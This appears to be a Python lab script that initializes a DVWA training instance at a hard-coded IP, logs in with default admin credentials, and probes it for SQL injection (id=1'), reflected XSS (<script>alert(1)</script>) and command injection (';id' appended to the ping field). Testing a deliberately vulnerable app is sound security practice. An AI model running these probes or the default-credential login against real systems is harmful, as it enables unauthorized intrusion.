"""初始化 DVWA 并测试"""
import asyncio
import sys
sys.stdout.reconfigure(encoding='utf-8')

import httpx

DVWA = "http://47.95.192.41:8081"

async def main():
    async with httpx.AsyncClient(timeout=15, follow_redirects=True) as client:
        # 1. 访问 setup 页面
        print("[1] 访问 setup 页面...")
        r = await client.get(f"{DVWA}/setup.php")
        print(f"    状态: {r.status_code}")
        
        # 2. 点击 Create/Reset Database
        print("[2] 初始化数据库...")
        r = await client.post(
            f"{DVWA}/setup.php",
            data={"create_db": "Create / Reset Database"}
        )
        print(f"    状态: {r.status_code}")
        
        if "Database has been created" in r.text or "already exists" in r.text:
            print("    [OK] 数据库已就绪")
        
        # 3. 登录
        print("[3] 登录 DVWA...")
        r = await client.get(f"{DVWA}/login.php")
        r = await client.post(
            f"{DVWA}/login.php",
            data={"username": "admin", "password": "password", "Login": "Login"},
            follow_redirects=True
        )
        print(f"    状态: {r.status_code}")
        print(f"    Cookie: {dict(client.cookies)}")
        
        # 4. 测试 SQLi
        print("\n[4] 测试 SQLi...")
        sqli_url = f"{DVWA}/vulnerabilities/sqli/"
        
        # 正常请求
        r1 = await client.get(f"{sqli_url}?id=1&Submit=Submit")
        print(f"    正常请求: len={len(r1.text)}")
        
        # 注入请求 - 单引号
        r2 = await client.get(f"{sqli_url}?id=1'&Submit=Submit")
        has_sql_error = any(e in r2.text.lower() for e in ["error", "syntax", "mysql", "warning"])
        print(f"    注入 ' : len={len(r2.text)}, sql_error={has_sql_error}")
        
        # 检查是否有差异
        if r1.text != r2.text:
            print(f"    [!] 响应有差异，可能存在 SQLi")
        
        # 5. 测试 XSS
        print("\n[5] 测试 XSS...")
        xss_url = f"{DVWA}/vulnerabilities/xss_r/"
        payload = "<script>alert(1)</script>"
        r = await client.get(f"{xss_url}?name={payload}")
        reflected = payload in r.text
        print(f"    反射: {'是' if reflected else '否'}")
        if reflected:
            print(f"    [!] XSS 反射成功")
        
        # 6. 测试 CMDi
        print("\n[6] 测试 CMDi...")
        cmdi_url = f"{DVWA}/vulnerabilities/exec/"
        r = await client.get(f"{cmdi_url}?ip=127.0.0.1")
        has_ping = "ping" in r.text.lower() or "output" in r.text.lower()
        print(f"    页面: len={len(r.text)}, has_output={has_ping}")
        
        if has_ping:
            # 测试命令注入
            r2 = await client.get(f"{cmdi_url}?ip=127.0.0.1;id")
            has_id = "uid=" in r2.text or "gid=" in r2.text
            print(f"    注入 ;id: has_id_output={has_id}")
            if has_id:
                print(f"    [!] CMDi 成功")
        
        print("\n[OK] 测试完成")

asyncio.run(main())
